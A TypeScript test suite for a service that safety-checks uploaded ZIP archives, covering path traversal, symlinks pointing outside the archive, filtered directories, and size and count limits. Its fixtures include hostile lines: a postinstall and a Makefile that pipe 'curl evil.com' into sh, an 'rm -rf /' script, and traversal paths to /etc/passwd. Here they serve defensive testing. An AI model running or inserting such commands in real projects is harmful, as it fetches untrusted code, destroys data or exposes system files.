import { describe, it, expect } from "vitest";
import AdmZip from "adm-zip";
import { validateZipSafety, SecurityError, validatePathTraversal, resolveAndCheckSymlink } from "../src/server/services/preprocessing";

function createZip(entries: Array<{ name: string; content?: string | Buffer }>): Buffer {
  const zip = new AdmZip();
  for (const entry of entries) {
    zip.addFile(entry.name, Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content || "hello world"));
  }
  return zip.toBuffer();
}

function createZipWithSymlink(entries: Array<{ name: string; linkTarget?: string; content?: string | Buffer }>): Buffer {
  const zip = new AdmZip();
  for (const entry of entries) {
    if (entry.linkTarget !== undefined) {
      const zipEntry = zip.addFile(entry.name, Buffer.from(entry.linkTarget));
      zipEntry.attr = (0xA000 | 0o644) * 0x10000;
    } else {
      zip.addFile(entry.name, Buffer.isBuffer(entry.content) ? entry.content : Buffer.from(entry.content || "hello world"));
    }
  }
  return zip.toBuffer();
}

describe("validatePathTraversal", () => {
  it("rejects paths with .. segments", () => {
    expect(() => validatePathTraversal("../../../etc/passwd")).toThrow(SecurityError);
    expect(() => validatePathTraversal("foo/../../../bar")).toThrow(SecurityError);
    expect(() => validatePathTraversal("normal/../path")).toThrow(SecurityError);
  });

  it("rejects paths containing .. in any component", () => {
    expect(() => validatePathTraversal("foo/bar/../../etc/passwd")).toThrow(SecurityError);
  });

  it("accepts normal paths", () => {
    expect(() => validatePathTraversal("src/index.ts")).not.toThrow();
    expect(() => validatePathTraversal("README.md")).not.toThrow();
    expect(() => validatePathTraversal("deep/nested/path/file.ts")).not.toThrow();
  });

  it("accepts filenames that contain '..' as literal characters, not as path segments", () => {
    expect(() => validatePathTraversal("changelog..notes.md")).not.toThrow();
    expect(() => validatePathTraversal("v1.2..3.md")).not.toThrow();
    expect(() => validatePathTraversal("a..b..c.txt")).not.toThrow();
  });
});

describe("resolveAndCheckSymlink", () => {
  it("rejects symlinks pointing outside the archive root", () => {
    expect(() => resolveAndCheckSymlink("link.txt", "../../../etc/passwd", "/tmp/archive")).toThrow(SecurityError);
    expect(() => resolveAndCheckSymlink("link.txt", "/etc/passwd", "/tmp/archive")).toThrow(SecurityError);
    expect(() => resolveAndCheckSymlink("subdir/link.txt", "../../etc/passwd", "/tmp/archive")).toThrow(SecurityError);
  });

  it("accepts symlinks pointing inside the archive root", () => {
    expect(() => resolveAndCheckSymlink("link.txt", "target.txt", "/tmp/archive")).not.toThrow();
    expect(() => resolveAndCheckSymlink("subdir/link.txt", "../target.txt", "/tmp/archive/subdir")).not.toThrow();
  });
});

describe("validateZipSafety", () => {
  it("accepts a clean ZIP with regular files", async () => {
    const zip = createZip([
      { name: "src/index.ts", content: "export const x = 1;" },
      { name: "README.md", content: "# Test" }
    ]);
    const result = await validateZipSafety(zip, "test-clean");
    expect(result.files.length).toBeGreaterThan(0);
    expect(result.truncated).toBe(false);
  }, 10000);

  it("strips .git and node_modules directories", async () => {
    const zip = createZip([
      { name: ".git/config", content: "git config" },
      { name: "node_modules/foo/index.js", content: "module.exports = {}" },
      { name: "src/index.ts", content: "export const x = 1;" }
    ]);
    const result = await validateZipSafety(zip, "test-strip");
    const paths = result.files.map((f) => f.path);
    expect(paths.some((p) => p.includes(".git"))).toBe(false);
    expect(paths.some((p) => p.includes("node_modules"))).toBe(false);
    expect(paths.some((p) => p === "src/index.ts")).toBe(true);
  }, 10000);

  it("marks binary files as skipped", async () => {
    const zip = createZip([
      { name: "image.png", content: Buffer.from([0x89, 0x50, 0x4e, 0x47]) },
      { name: "src/index.ts", content: "export const x = 1;" }
    ]);
    const result = await validateZipSafety(zip, "test-binary");
    const png = result.files.find((f) => f.path === "image.png");
    expect(png?.skipped).toBe(true);
    expect(png?.skipReason).toBe("binary_file");
  }, 10000);

  it("marks files over 1MB as skipped with correct reason", async () => {
    const largeContent = "x".repeat(2 * 1024 * 1024);
    const zip = createZip([
      { name: "large.txt", content: largeContent },
      { name: "src/index.ts", content: "export const x = 1;" }
    ]);
    const result = await validateZipSafety(zip, "test-large");
    const large = result.files.find((f) => f.path === "large.txt");
    expect(large?.skipped).toBe(true);
    expect(large?.skipReason).toContain("exceeds_max_parse_size");
  }, 10000);

  it("never executes repository code — no code execution paths in preprocessing", async () => {
    const zip = createZip([
      { name: "package.json", content: JSON.stringify({ name: "malicious", scripts: { postinstall: "curl evil.com | sh" } }) },
      { name: "install.sh", content: "rm -rf /" },
      { name: "Makefile", content: "all:\n\tcurl evil.com | sh" }
    ]);
    const result = await validateZipSafety(zip, "test-noexec");
    const paths = result.files.map((f) => f.path);
    expect(paths).toContain("package.json");
    expect(paths).toContain("install.sh");
    expect(paths).toContain("Makefile");
    for (const f of result.files) {
      expect(f.path).not.toContain("node_modules");
    }
  }, 10000);

  it("handles ZIP files at the 5000-file count boundary", async () => {
    const entries = Array.from({ length: 5000 }, (_, i) => ({
      name: `file-${i}.ts`,
      content: `// file ${i}`
    }));
    const zip = createZip(entries);
    const result = await validateZipSafety(zip, "test-count");
    expect(result.totalFiles).toBe(5000);
    expect(result.truncated).toBe(false);
  }, 30000);

  it("truncates when exceeding 5000 files", async () => {
    const entries = Array.from({ length: 5001 }, (_, i) => ({
      name: `file-${i}.ts`,
      content: `// file ${i}`
    }));
    const zip = createZip(entries);
    const result = await validateZipSafety(zip, "test-truncate");
    expect(result.totalFiles).toBe(5000);
    expect(result.truncated).toBe(true);
  }, 30000);

  it("rejects zero files after filtering", async () => {
    const zip = createZip([
      { name: ".git/config", content: "git config" },
      { name: "node_modules/foo/index.js", content: "module.exports = {}" }
    ]);
    await expect(validateZipSafety(zip, "test-empty")).rejects.toThrow(SecurityError);
  }, 10000);

  it("rejects ZIPs containing real Unix symlink entries pointing outside the archive root", async () => {
    const zip = createZipWithSymlink([
      { name: "link.txt", linkTarget: "../../../etc/passwd" },
      { name: "README.md", content: "# Test" }
    ]);
    await expect(validateZipSafety(zip, "test-symlink")).rejects.toThrow(SecurityError);
  }, 10000);

  it("rejects ZIPs containing real Unix symlink entries pointing to absolute paths outside root", async () => {
    const zip = createZipWithSymlink([
      { name: "link.txt", linkTarget: "/etc/passwd" }
    ]);
    await expect(validateZipSafety(zip, "test-symlink-abs")).rejects.toThrow(SecurityError);
  }, 10000);
});
